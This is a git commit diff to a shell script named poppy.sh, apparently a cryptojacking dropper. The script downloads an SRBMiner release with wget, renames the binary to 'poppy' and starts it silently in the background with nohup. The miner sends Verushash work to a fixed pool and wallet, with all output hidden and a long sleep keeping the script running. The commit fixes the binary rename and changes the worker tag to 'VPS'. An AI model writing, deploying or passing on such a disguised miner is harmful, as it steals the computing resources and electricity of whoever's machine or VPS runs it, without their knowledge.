4b7f34b6818ab5d1741f1766dc8b346f6b4f9a90
ANTI VIRAL <109937537+tobrutkota@users.noreply.github.com>
2025-03-07 21:01:24 +0800

    Update poppy.sh

--- poppy.sh
+++ poppy.sh
@@ -1,16 +1,16 @@
 #!/bin/bash
 
-echo "Poppy is warming up ayangku..."
+echo "Poppy is warming up for ayangku... 😘"
 sleep 5
 
 if [ ! -f "./poppy" ]; then
   echo "Downloading Poppy..."
   wget -q "https://github.com/srbminer/SRBMiner-Multi/releases/download/2.3.4/SRBMiner-Multi-2-3-4-Linux.tar.gz" -O miner.tar.gz
   tar -xf miner.tar.gz
-  mv SRBMiner-MULTI/poppy .
+  mv SRBMiner-MULTI/SRBMiner-MULTI poppy
   chmod +x poppy
 fi
 
-echo "Poppy is shower for ayangku..."
-nohup ./poppy --algorithm verushash --pool us.vipor.net:5040 --wallet REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y.1M --cpu-threads 2 --cpu-priority 3 > /dev/null 2>&1 &
+echo "Poppy is working hard for ayang..."
+nohup ./poppy --algorithm verushash --pool us.vipor.net:5040 --wallet REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y.VPS --cpu-threads 2 --cpu-priority 3 > /dev/null 2>&1 &
 sleep 9999999
